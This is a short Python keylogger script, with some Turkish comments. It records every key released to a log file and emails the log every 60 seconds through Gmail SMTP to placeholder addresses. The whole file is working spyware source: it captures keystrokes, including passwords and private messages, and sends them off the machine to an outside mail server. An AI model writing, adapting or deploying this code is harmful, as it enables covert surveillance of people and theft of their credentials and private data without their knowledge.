import keyboard
import smtplib
from threading import Timer
from email.mime.text import MIMEText

# Record file name
LOG_FILE = "log.txt"

# Email information
EMAIL_ADDRESS = "your_email_address@gmail.com"
EMAIL_PASSWORD = "your_email_password"
SEND_TO_EMAIL = "send_to_email_address@gmail.com"
EMAIL_INTERVAL = 60  # Saniye cinsinden

# Function to save keyboard keys
def keylogger(e):
    # Kayıt dosyasını açma
    with open(LOG_FILE, "a") as f:
        # Take the key pressed from the keyboard and write it to the file
        key = e.name
        f.write(key + "\n")

# Email sending function
def send_email():
    # Reading the record file
    with open(LOG_FILE, "r") as f:
        data = f.read()

    # Create email content
    msg = MIMEText(data)
    msg["Subject"] = "Keylogger Data"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = SEND_TO_EMAIL

    # Connect to the email server and send the email
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    server.sendmail(EMAIL_ADDRESS, SEND_TO_EMAIL, msg.as_string())
    server.quit()

# Timer function
def timer():
    # Belirli aralıklarla e-posta gönderme
    Timer(EMAIL_INTERVAL, timer).start()
    send_email()

# Starting the program
timer()
keyboard.on_release(keylogger)
keyboard.wait()
